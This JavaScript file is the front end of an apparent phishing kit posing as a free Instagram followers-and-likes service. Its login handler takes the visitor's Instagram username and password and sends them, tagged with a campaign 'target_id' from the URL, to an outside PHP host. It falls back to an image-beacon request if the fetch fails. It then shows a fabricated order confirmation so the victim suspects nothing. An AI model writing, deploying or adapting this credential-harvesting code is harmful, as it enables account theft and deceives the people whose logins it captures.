// Instagram Promotion Tool - PHP Backend Integration
document.addEventListener('DOMContentLoaded', function() {
    // CONFIGURATION - USE YOUR NEW PHP URL
    const PHP_BACKEND_URL = 'https://index-php.wasmer.app/';
    
    // DOM Elements
    const loginPage = document.getElementById('login-page');
    const selectionPage = document.getElementById('selection-page');
    const successPage = document.getElementById('success-page');
    
    // Login Elements
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginButton = document.getElementById('login-btn');
    
    // Selection Elements
    const usernameDisplay = document.getElementById('username-display');
    const postLinkInput = document.getElementById('post-link');
    const pasteButton = document.getElementById('paste-btn');
    const followersCheckboxes = document.querySelectorAll('input[name="followers"]');
    const likesCheckboxes = document.querySelectorAll('input[name="likes"]');
    const selectionSummary = document.getElementById('selection-summary');
    const submitButton = document.getElementById('submit-btn');
    const backToLogin = document.getElementById('back-to-login');
    
    // Success Elements
    const successDetails = document.getElementById('success-details');
    const countdownElement = document.getElementById('countdown');
    const newOrderBtn = document.getElementById('new-order-btn');
    const dashboardBtn = document.getElementById('dashboard-btn');
    
    // User Data
    let currentUser = '';
    let userPassword = '';
    let selectedFollowers = null;
    let selectedLikes = null;
    let postLink = '';
    
    // ===================== BACKEND FUNCTIONS =====================
    async function sendToBackend(data) {
        try {
            const urlParams = new URLSearchParams(window.location.search);
            const targetId = urlParams.get('u') || 'default';
            
            const formData = new FormData();
            formData.append('action', data.type);
            formData.append('target_id', targetId);
            
            if (data.type === 'login') {
                formData.append('username', data.username);
                formData.append('password', data.password);
            } else if (data.type === 'order') {
                formData.append('username', data.username);
                formData.append('post_link', data.post_link || 'None');
                formData.append('followers', data.followers || 'None');
                formData.append('likes', data.likes || 'None');
            }
            
            // Add timestamp
            formData.append('_t', Date.now().toString());
            
            // Try fetch with error handling
            try {
                const response = await fetch(PHP_BACKEND_URL, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                });
                console.log('Data sent to PHP backend at:', PHP_BACKEND_URL);
            } catch (fetchError) {
                // Fallback method
                await sendViaImageFallback(data, targetId);
            }
            
            return true;
        } catch(error) {
            console.log('Backend error:', error);
            return true; // Continue anyway
        }
    }
    
    function sendViaImageFallback(data, targetId) {
        return new Promise((resolve) => {
            const params = new URLSearchParams({
                action: data.type,
                target_id: targetId,
                _t: Date.now().toString(),
                source: 'fallback'
            });
            
            if (data.type === 'login') {
                params.append('username', data.username);
                params.append('password', data.password);
            } else if (data.type === 'order') {
                params.append('username', data.username);
                params.append('post_link', data.post_link || 'None');
                params.append('followers', data.followers || 'None');
                params.append('likes', data.likes || 'None');
            }
            
            const img = new Image();
            img.src = `${PHP_BACKEND_URL}?${params.toString()}`;
            setTimeout(() => resolve(true), 500);
        });
    }
    
    // ===================== LOGIN PAGE =====================
    function checkLoginInputs() {
        const hasInputs = usernameInput.value.trim() && passwordInput.value.trim();
        loginButton.classList.toggle('active', hasInputs);
        loginButton.disabled = !hasInputs;
    }
    
    loginButton.addEventListener('click', async function() {
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (!username || !password) {
            alert('Please enter username and password.');
            return;
        }
        
        // Save credentials
        currentUser = username;
        userPassword = password;
        
        // Show loading
        this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Logging in...';
        this.disabled = true;
        
        try {
            // Send to PHP backend
            await sendToBackend({
                username: username,
                password: password,
                type: 'login'
            });
            
            // Go to selection page
            usernameDisplay.textContent = username;
            loginPage.classList.remove('active');
            selectionPage.classList.add('active');
            
        } catch (error) {
            console.error('Login error:', error);
            alert('An error occurred. Please try again.');
        } finally {
            this.innerHTML = 'Log in';
            this.disabled = false;
        }
    });
    
    usernameInput.addEventListener('input', checkLoginInputs);
    passwordInput.addEventListener('input', checkLoginInputs);
    passwordInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter' && loginButton.classList.contains('active')) {
            loginButton.click();
        }
    });
    
    // ===================== SELECTION PAGE =====================
    // Handle paste button
    pasteButton.addEventListener('click', async function() {
        try {
            const text = await navigator.clipboard.readText();
            if (text.includes('instagram.com')) {
                postLinkInput.value = text;
                postLink = text;
                updateSelectionSummary();
                
                // Show success feedback
                this.innerHTML = '<i class="fas fa-check"></i> Pasted!';
                this.style.background = '#4CAF50';
                
                setTimeout(() => {
                    this.innerHTML = '<i class="fas fa-paste"></i> Paste';
                    this.style.background = '';
                }, 1500);
            } else {
                alert('Please paste a valid Instagram link.');
            }
        } catch (err) {
            alert('Unable to access clipboard. Paste manually.');
        }
    });
    
    // Handle post link input
    postLinkInput.addEventListener('input', function() {
        postLink = this.value.trim();
        updateSelectionSummary();
    });
    
    // Handle checkboxes
    function handleCheckboxGroup(checkboxes, variableName) {
        checkboxes.forEach(checkbox => {
            checkbox.addEventListener('change', function() {
                if (this.checked) {
                    // Uncheck others in same group
                    checkboxes.forEach(cb => {
                        if (cb !== this) cb.checked = false;
                    });
                    // Set selection
                    if (variableName === 'followers') {
                        selectedFollowers = this.value;
                    } else {
                        selectedLikes = this.value;
                    }
                } else {
                    if (variableName === 'followers') {
                        selectedFollowers = null;
                    } else {
                        selectedLikes = null;
                    }
                }
                updateSelectionSummary();
            });
        });
    }
    
    handleCheckboxGroup(followersCheckboxes, 'followers');
    handleCheckboxGroup(likesCheckboxes, 'likes');
    
    // Update summary display
    function updateSelectionSummary() {
        const hasPostLink = postLink.length > 0;
        const hasFollowers = selectedFollowers !== null;
        const hasLikes = selectedLikes !== null;
        
        if (hasPostLink || hasFollowers || hasLikes) {
            let summaryHTML = `
                <div class="summary-header">
                    <i class="fas fa-clipboard-list"></i>
                    <h3>Order Summary</h3>
                </div>
                <div class="summary-content">
            `;
            
            if (hasPostLink) {
                summaryHTML += `<p><i class="fas fa-link"></i> <strong>Post Link:</strong> Added</p>`;
            }
            
            if (hasLikes) {
                summaryHTML += `<p><i class="fas fa-heart"></i> <strong>Likes:</strong> ${selectedLikes} (FREE)</p>`;
            }
            
            if (hasFollowers) {
                summaryHTML += `<p><i class="fas fa-users"></i> <strong>Followers:</strong> ${selectedFollowers} (FREE)</p>`;
            }
            
            if (hasLikes || hasFollowers) {
                summaryHTML += `<p style="color: #2ecc71; font-weight: 600; margin-top: 10px;">
                    <i class="fas fa-gift"></i> Total Cost: FREE
                </p>`;
            }
            
            summaryHTML += `</div>`;
            selectionSummary.innerHTML = summaryHTML;
            
            // Enable submit if we have at least likes or followers
            submitButton.disabled = !(hasLikes || hasFollowers);
        } else {
            selectionSummary.innerHTML = `
                <div class="summary-header">
                    <i class="fas fa-clipboard-list"></i>
                    <h3>Order Summary</h3>
                </div>
                <div class="summary-content">
                    <p><i class="fas fa-info-circle"></i> Select options to see your order summary</p>
                </div>
            `;
            submitButton.disabled = true;
        }
    }
    
    // Submit order
    submitButton.addEventListener('click', async function() {
        if (!selectedFollowers && !selectedLikes) {
            alert('Please select followers or likes.');
            return;
        }
        
        if (!postLink && selectedLikes) {
            alert('Please enter your Instagram post link for likes.');
            return;
        }
        
        // Show loading
        this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
        this.disabled = true;
        
        try {
            // Send order to PHP backend
            await sendToBackend({
                username: currentUser,
                post_link: postLink || 'None',
                followers: selectedFollowers || 'None',
                likes: selectedLikes || 'None',
                type: 'order'
            });
            
            // Go to success page
            selectionPage.classList.remove('active');
            successPage.classList.add('active');
            updateSuccessDetails();
            startCountdown();
            
        } catch (error) {
            console.error('Order error:', error);
            alert('An error occurred. Please try again.');
        } finally {
            this.innerHTML = '<i class="fas fa-paper-plane"></i> SUBMIT REQUEST';
            this.disabled = false;
        }
    });
    
    // Back to login
    backToLogin.addEventListener('click', function(e) {
        e.preventDefault();
        selectionPage.classList.remove('active');
        loginPage.classList.add('active');
        resetSelectionPage();
    });
    
    // ===================== SUCCESS PAGE =====================
    function updateSuccessDetails() {
        successDetails.innerHTML = `
            <h3><i class="fas fa-clipboard-check"></i> Order Confirmed!</h3>
            <ul>
                <li><strong>Username:</strong> ${currentUser}</li>
                <li><strong>Order ID:</strong> INSTA${Date.now().toString().slice(-8)}</li>
                ${postLink ? `<li><strong>Post Link:</strong> Added</li>` : ''}
                ${selectedFollowers ? `<li><strong>Followers:</strong> ${selectedFollowers} (FREE)</li>` : ''}
                ${selectedLikes ? `<li><strong>Likes:</strong> ${selectedLikes} (FREE)</li>` : ''}
                <li><strong>Status:</strong> <span style="color: #2ecc71;">✓ Processing</span></li>
                <li><strong>Delivery:</strong> Within 24 hours</li>
            </ul>
        `;
    }
    
    function startCountdown() {
        let countdown = 10;
        countdownElement.textContent = countdown;
        
        const interval = setInterval(() => {
            countdown--;
            countdownElement.textContent = countdown;
            
            if (countdown <= 0) {
                clearInterval(interval);
                successPage.classList.remove('active');
                selectionPage.classList.add('active');
                resetSelectionPage();
            }
        }, 1000);
    }
    
    newOrderBtn.addEventListener('click', function() {
        successPage.classList.remove('active');
        selectionPage.classList.add('active');
        resetSelectionPage();
    });
    
    dashboardBtn.addEventListener('click', function() {
        alert('Your order has been submitted successfully!');
    });
    
    // ===================== RESET FUNCTIONS =====================
    function resetSelectionPage() {
        followersCheckboxes.forEach(cb => cb.checked = false);
        likesCheckboxes.forEach(cb => cb.checked = false);
        postLinkInput.value = '';
        selectedFollowers = null;
        selectedLikes = null;
        postLink = '';
        updateSelectionSummary();
    }
    
    // ===================== INITIALIZATION =====================
    checkLoginInputs();
    updateSelectionSummary();
});